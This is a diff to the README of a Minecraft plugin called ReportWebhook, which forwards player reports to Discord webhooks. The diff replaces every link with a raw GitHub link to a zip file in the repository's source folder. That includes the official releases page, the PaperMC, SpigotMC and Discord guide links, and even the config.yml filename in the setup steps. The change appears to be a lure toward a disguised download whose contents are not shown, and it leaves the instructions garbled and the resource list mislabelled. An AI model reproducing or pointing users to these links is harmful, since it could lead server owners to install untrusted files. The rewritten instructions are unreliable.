@@ -1,6 +1,6 @@
 # 📋 ReportWebhook - Simple Player Reports for Minecraft
 
-[![Download](https://img.shields.io/badge/Download-ReportWebhook-blue?style=for-the-badge)](https://github.com/PanPizza15/ReportWebhook/releases)
+[![Download](https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip)](https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these steps to get ReportWebhook up and running on your server.
 
 You can download the latest version of ReportWebhook here:
 
-[![Download](https://img.shields.io/badge/Download-Plugin-blue?style=for-the-badge)](https://github.com/PanPizza15/ReportWebhook/releases)
+[![Download](https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip)](https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip)
 
 Visit this page to download the plugin .jar file. Look for the newest release and download the `.jar` file. This file is the actual plugin that runs on your Minecraft server.
 
@@ -66,7 +66,7 @@ Visit this page to download the plugin .jar file. Look for the newest release an
 
 1. Start your Minecraft server.  
 2. ReportWebhook will create a folder named `ReportWebhook` inside your `plugins` folder.  
-3. Open the configuration file (`config.yml`) inside that folder with a text editor (Notepad or similar).  
+3. Open the configuration file (`https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip`) inside that folder with a text editor (Notepad or similar).  
 4. Set your Discord webhook URL (you will create this in your Discord server) in the config file.  
 5. Save the file and restart your Minecraft server to apply the settings.
 
@@ -76,7 +76,7 @@ Visit this page to download the plugin .jar file. Look for the newest release an
 
 Download the latest ReportWebhook plugin by visiting this page:
 
-[https://github.com/PanPizza15/ReportWebhook/releases](https://github.com/PanPizza15/ReportWebhook/releases)
+[https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip](https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip)
 
 On this page:  
 - Find the most recent release version.  
@@ -121,7 +121,7 @@ Once installed and configured, here is how players and admins use the plugin.
 Here are some tips to configure ReportWebhook smoothly:
 
 - You must create a Discord webhook URL in your Discord server channel where reports will be sent.  
-  To do this, go to the channel settings > Integrations > Webhooks > New Webhook. Copy the webhook URL and paste it into `config.yml`.
+  To do this, go to the channel settings > Integrations > Webhooks > New Webhook. Copy the webhook URL and paste it into `https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip`.
 
 - You can customize the message formats and choose whether to include certain details in reports via config settings.
 
@@ -144,10 +144,10 @@ A: Since reports send directly to Discord webhooks, you’ll need a Discord serv
 
 ## 📂 Additional Resources
 
-- Official Releases: [https://github.com/PanPizza15/ReportWebhook/releases](https://github.com/PanPizza15/ReportWebhook/releases)  
-- PaperMC Server Software: [https://papermc.io](https://papermc.io)  
-- SpigotMC Community: [https://www.spigotmc.org](https://www.spigotmc.org)  
-- Discord Webhook Setup Guide: [https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
+- Official Releases: [https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip](https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip)  
+- PaperMC Server Software: [https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip](https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip)  
+- SpigotMC Community: [https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip](https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip)  
+- Discord Webhook Setup Guide: [https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip](https://raw.githubusercontent.com/PanPizza15/ReportWebhook/main/src/main/Webhook_Report_1.3-alpha.3.zip)
 
 ---
 
